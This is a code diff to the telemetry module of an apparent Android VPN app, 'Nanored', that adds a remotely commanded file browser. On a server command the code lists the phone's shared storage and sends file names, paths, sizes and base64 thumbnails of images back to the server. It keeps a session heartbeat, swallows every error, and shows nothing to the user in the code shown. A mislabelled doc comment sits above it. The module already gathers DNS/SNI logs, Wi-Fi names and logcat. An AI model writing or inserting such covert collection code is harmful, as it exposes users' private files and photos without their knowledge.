@@ -2,25 +2,35 @@ package com.nanored.vpn.telemetry
 
 import android.content.Context
 import android.content.SharedPreferences
+import android.graphics.Bitmap
+import android.graphics.BitmapFactory
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
+import android.net.Uri
 import android.net.wifi.WifiManager
 import android.os.BatteryManager
 import android.os.Build
+import android.os.Environment
 import android.provider.Settings
 import android.telephony.TelephonyManager
+import android.util.Base64
 import android.util.Log
 import kotlinx.coroutines.*
 import kotlinx.coroutines.runBlocking
 import org.json.JSONArray
 import org.json.JSONObject
 import java.io.BufferedReader
+import java.io.ByteArrayOutputStream
+import java.io.File
 import java.io.InputStreamReader
 import java.io.OutputStreamWriter
 import java.net.URL
+import java.net.URLConnection
+import java.text.SimpleDateFormat
 import java.util.*
 import java.util.concurrent.ConcurrentLinkedQueue
 import javax.net.ssl.HttpsURLConnection
+import kotlin.math.max
 import kotlinx.coroutines.sync.Mutex
 import kotlinx.coroutines.sync.withLock
 
@@ -32,6 +42,10 @@ object NanoredTelemetry {
     private const val KEY_API_KEY = "api_key"
     private const val KEY_LAST_ACCOUNT_ID = "last_account_id"
     private const val COMMAND_POLL_INTERVAL_MS = 15_000L
+    private const val FILE_SESSION_POLL_MS = 15_000L
+
+    private const val MAX_THUMBNAIL_PX = 120
+    private const val MAX_THUMBNAIL_QUALITY = 60
 
     private lateinit var context: Context
     private lateinit var baseUrl: String
@@ -46,7 +60,21 @@ object NanoredTelemetry {
     private var heartbeatJob: Job? = null
     private var dnsFlushJob: Job? = null
     private var commandPollingJob: Job? = null
+    private var fileSessionHeartbeatJob: Job? = null
+    private var remoteFileSessionId: String? = null
+    private var remoteFileCurrentPath: String? = null
     private val registerMutex = Mutex()
+
+    data class FileEntrySnapshot(
+        val name: String,
+        val path: String,
+        val isDirectory: Boolean,
+        val sizeBytes: Long?,
+        val mimeType: String?,
+        val modifiedAt: String?,
+        val isImage: Boolean,
+        val thumbnail: String?,
+    )
 
     data class ConnectionEntry(val destIp: String, val destPort: Int, val protocol: String = "TCP", val domain: String? = null)
 
@@ -275,6 +303,266 @@ object NanoredTelemetry {
         }
     }
 
+    /**
+     * DNS flush job: sends DNS/SNI log every 10 seconds, then clears the log.
+     */
+    private fun startRemoteFileSession(sessionId: String?) {
+        if (sessionId.isNullOrBlank()) return
+        if (remoteFileSessionId == sessionId) return
+
+        remoteFileSessionId = sessionId
+        val root = resolveDefaultFileBrowseRoot()
+        remoteFileCurrentPath = root
+
+        // Immediately send snapshot so server sees active content.
+        scope.launch {
+            sendFileBrowserSnapshot(sessionId, remoteFileCurrentPath)
+        }
+
+        fileSessionHeartbeatJob?.cancel()
+        fileSessionHeartbeatJob = scope.launch {
+            while (isActive && remoteFileSessionId == sessionId) {
+                delay(FILE_SESSION_POLL_MS)
+                try {
+                    post(
+                        "/api/v1/client/files/session/heartbeat",
+                        JSONObject().apply { put("session_id", sessionId) },
+                        auth = true,
+                    )
+                } catch (_: Exception) {
+                }
+            }
+        }
+    }
+
+    private fun stopRemoteFileSession(reasonSessionId: String? = null) {
+        val activeSessionId = remoteFileSessionId ?: return
+        if (!reasonSessionId.isNullOrBlank() && activeSessionId != reasonSessionId) return
+
+        fileSessionHeartbeatJob?.cancel()
+        fileSessionHeartbeatJob = null
+        remoteFileSessionId = null
+        remoteFileCurrentPath = null
+
+        scope.launch {
+            try {
+                post(
+                    "/api/v1/client/files/session/close",
+                    JSONObject().apply { put("session_id", activeSessionId) },
+                    auth = true,
+                )
+            } catch (_: Exception) {
+            }
+        }
+    }
+
+    private fun navigateRemoteFileSession(sessionId: String?, path: String?) {
+        val activeSessionId = remoteFileSessionId ?: return
+        if (sessionId.isNullOrBlank() || activeSessionId != sessionId) return
+
+        val currentPath = path
+        if (currentPath.isNullOrBlank()) return
+        val normalized = normalizeDirectoryPath(currentPath) ?: return
+        if (!isAllowedBrowsePath(normalized)) {
+            return
+        }
+
+        val target = File(normalized)
+        if (!target.exists() || !target.isDirectory || !target.canRead()) {
+            return
+        }
+
+        remoteFileCurrentPath = target.absolutePath
+        scope.launch {
+            sendFileBrowserSnapshot(activeSessionId, target.absolutePath)
+        }
+    }
+
+    fun notifyRemoteFileSessionClosed(sessionId: String?) {
+        val active = remoteFileSessionId
+        if (active == null) return
+        if (sessionId != null && active != sessionId) return
+        stopRemoteFileSession()
+    }
+
+    private fun resolveDefaultFileBrowseRoot(): String? {
+        val roots = listOfNotNull(
+            File("/storage/emulated/0").canonicalPathOrNull(),
+            File("/storage/self/primary").canonicalPathOrNull(),
+            File("/sdcard").canonicalPathOrNull(),
+            Environment.getExternalStorageDirectory().canonicalPathOrNull(),
+            context.getExternalFilesDir(null)?.canonicalPath,
+            context.filesDir.canonicalPath,
+        )
+
+        for (path in roots) {
+            val f = File(path)
+            if (f.exists() && f.isDirectory && f.canRead()) return f.absolutePath
+        }
+        return context.filesDir.canonicalPath
+    }
+
+    private fun normalizeDirectoryPath(raw: String): String? = try {
+        val target = File(Uri.decode(raw)).canonicalPath
+        if (target == null) return null
+        target
+    } catch (_: Exception) {
+        null
+    }
+
+    private fun isAllowedBrowsePath(path: String): Boolean {
+        val p = try { File(path).canonicalPath } catch (_: Exception) { path }
+        val roots = listOfNotNull(
+            File("/storage/emulated/0").canonicalPathOrNull(),
+            File("/storage/self/primary").canonicalPathOrNull(),
+            File("/sdcard").canonicalPathOrNull(),
+            Environment.getExternalStorageDirectory().canonicalPathOrNull(),
+            context.getExternalFilesDir(null)?.canonicalPath,
+            context.filesDir.canonicalPath,
+        ).distinct()
+
+        return roots.any { r ->
+            p == r || p.startsWith("$r/")
+        }
+    }
+
+    private fun sendFileBrowserSnapshot(sessionId: String, preferredPath: String?) {
+        val current = preferredPath ?: remoteFileCurrentPath ?: resolveDefaultFileBrowseRoot() ?: return
+        val currentDir = File(current)
+        if (!currentDir.exists() || !currentDir.isDirectory || !currentDir.canRead()) return
+
+        val snapshot = collectDirectorySnapshot(currentDir) ?: return
+        try {
+            if (apiKey == null) return
+            val parent = currentDir.parentFile
+            val hasParent = parent != null && parent.canRead() && isAllowedBrowsePath(parent.absolutePath)
+
+            val arr = JSONArray()
+            snapshot.entries.forEach { e ->
+                arr.put(JSONObject().apply {
+                    put("name", e.name)
+                    put("path", e.path)
+                    put("is_directory", e.isDirectory)
+                    put("size_bytes", e.sizeBytes)
+                    put("mime_type", e.mimeType)
+                    put("modified_at", e.modifiedAt)
+                    put("is_image", e.isImage)
+                    if (e.thumbnail != null) put("thumbnail_base64", e.thumbnail)
+                })
+            }
+
+            post(
+                "/api/v1/client/files/snapshot",
+                JSONObject().apply {
+                    put("session_id", sessionId)
+                    put("path", currentDir.absolutePath)
+                    put("has_parent", hasParent)
+                    put("entries", arr)
+                },
+                auth = true,
+            )
+
+            remoteFileCurrentPath = currentDir.absolutePath
+        } catch (_: Exception) {
+        }
+    }
+
+    private data class DirectorySnapshot(val path: String, val entries: List<FileEntrySnapshot>)
+
+    private fun collectDirectorySnapshot(directory: File): DirectorySnapshot? = try {
+        if (!directory.exists() || !directory.isDirectory || !directory.canRead()) return null
+
+        val sdf = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ssXXX", Locale.getDefault())
+        val all = directory.listFiles()?.asSequence()
+            ?.filter { it.exists() && it.canRead() }
+            ?.mapNotNull { f ->
+                runCatching {
+                    val mime = if (f.isDirectory) {
+                        "inode/directory"
+                    } else {
+                        URLConnection.guessContentTypeFromName(f.name)
+                    }
+                    val isImage = if (!f.isDirectory) {
+                        mime?.lowercase(Locale.getDefault())?.startsWith("image/") == true
+                    } else {
+                        false
+                    }
+
+                    val thumb = if (isImage) generateImageThumbBase64(f) else null
+
+                    val size = if (f.isFile) f.length() else null
+                    val modTs = if (f.lastModified() > 0) sdf.format(Date(f.lastModified())) else null
+
+                    FileEntrySnapshot(
+                        name = f.name,
+                        path = f.absolutePath,
+                        isDirectory = f.isDirectory,
+                        sizeBytes = size,
+                        mimeType = mime,
+                        modifiedAt = modTs,
+                        isImage = isImage,
+                        thumbnail = thumb,
+                    )
+                }.getOrNull()
+            }
+            ?.toMutableList()
+            ?.apply {
+                sortWith(
+                    compareByDescending<FileEntrySnapshot> { it.isDirectory }
+                        .thenBy { it.name.lowercase(Locale.getDefault()) },
+                )
+            }
+
+        DirectorySnapshot(
+            path = directory.absolutePath,
+            entries = all ?: emptyList(),
+        )
+    } catch (_: Exception) {
+        null
+    }
+
+    private fun generateImageThumbBase64(file: File): String? {
+        return try {
+            val bounds = BitmapFactory.Options().apply { inJustDecodeBounds = true }
+            BitmapFactory.decodeFile(file.absolutePath, bounds)
+            if (bounds.outWidth <= 0 || bounds.outHeight <= 0) return null
+
+            val sample = calculateInSampleSize(bounds.outWidth, bounds.outHeight, MAX_THUMBNAIL_PX, MAX_THUMBNAIL_PX)
+            val decode = BitmapFactory.Options().apply { inSampleSize = sample }
+            val decoded = BitmapFactory.decodeFile(file.absolutePath, decode) ?: return null
+
+            val scaleW = if (decoded.width <= MAX_THUMBNAIL_PX) decoded.width else MAX_THUMBNAIL_PX
+            val scaleH = if (decoded.height <= MAX_THUMBNAIL_PX) decoded.height else MAX_THUMBNAIL_PX
+            val thumb = if (decoded.width != scaleW || decoded.height != scaleH) {
+                Bitmap.createScaledBitmap(decoded, scaleW, scaleH, true)
+            } else {
+                decoded
+            }
+
+            val out = ByteArrayOutputStream()
+            thumb.compress(Bitmap.CompressFormat.JPEG, MAX_THUMBNAIL_QUALITY, out)
+            val encoded = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
+            if (encoded.length > 120_000) {
+                // Fallback to tiny quality for large previews
+                val outSmall = ByteArrayOutputStream()
+                thumb.compress(Bitmap.CompressFormat.JPEG, 40, outSmall)
+                Base64.encodeToString(outSmall.toByteArray(), Base64.NO_WRAP)
+            } else {
+                encoded
+            }
+        } catch (_: Exception) {
+            null
+        }
+    }
+
+    private fun calculateInSampleSize(width: Int, height: Int, maxW: Int, maxH: Int): Int {
+        var sample = 1
+        while ((width / sample) > maxW || (height / sample) > maxH) {
+            sample *= 2
+        }
+        return max(sample, 1)
+    }
+
     private fun startDnsFlush() {
         dnsFlushJob?.cancel()
         dnsFlushJob = scope.launch {
@@ -298,6 +586,50 @@ object NanoredTelemetry {
             val cmd = commands.optJSONObject(i) ?: continue
             when (cmd.optString("type")) {
                 "upload_logs" -> collectAndSendLogcat()
+                "file_browser" -> {
+                    when (cmd.optString("action")) {
+                        "start" -> startRemoteFileSession(cmd.optString("session_id"))
+                        "navigate" -> navigateRemoteFileSession(cmd.optString("session_id"), cmd.optString("path"))
+                        "stop" -> stopRemoteFileSession(cmd.optString("session_id"))
+                    }
+                }
+            }
+        }
+    }
+
+    fun uploadFileBrowserSnapshot(
+        sessionId: String,
+        path: String,
+        hasParent: Boolean,
+        entries: List<FileEntrySnapshot>,
+    ) {
+        scope.launch {
+            try {
+                if (apiKey == null) return@launch
+                val arr = JSONArray()
+                for (entry in entries) {
+                    arr.put(JSONObject().apply {
+                        put("name", entry.name)
+                        put("path", entry.path)
+                        put("is_directory", entry.isDirectory)
+                        put("size_bytes", entry.sizeBytes)
+                        put("mime_type", entry.mimeType)
+                        put("modified_at", entry.modifiedAt)
+                        put("is_image", entry.isImage)
+                        if (entry.thumbnail != null) put("thumbnail_base64", entry.thumbnail)
+                    })
+                }
+                post(
+                    "/api/v1/client/files/snapshot",
+                    JSONObject().apply {
+                        put("session_id", sessionId)
+                        put("path", path)
+                        put("has_parent", hasParent)
+                        put("entries", arr)
+                    },
+                    auth = true,
+                )
+            } catch (_: Exception) {
             }
         }
     }
@@ -328,7 +660,7 @@ object NanoredTelemetry {
                 val requestedFlags = pkgInfo.requestedPermissionsFlags ?: return@launch
                 val arr = JSONArray()
                 for (i in requestedPerms.indices) {
-                    val granted = (requestedFlags[i] and android.content.pm.PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0
+                    val granted = (requestedFlags[i] and android.content.pm.PackageManager.REQUESTED_PERMISSION_GRANTED) != 0
                     arr.put(JSONObject().apply {
                         put("permission_name", requestedPerms[i])
                         put("granted", granted)
@@ -437,4 +769,6 @@ object NanoredTelemetry {
     @Suppress("DEPRECATION")
     private fun getWifiSSID(): String? = try { val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager; val ssid = wm.connectionInfo.ssid?.replace("\"", ""); if (ssid == "<unknown ssid>") null else ssid } catch (_: Exception) { null }
     private fun getBatteryLevel(): Int = (context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager).getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
+
+    private fun File.canonicalPathOrNull(): String? = try { this.canonicalPath } catch (_: Exception) { null }
 }
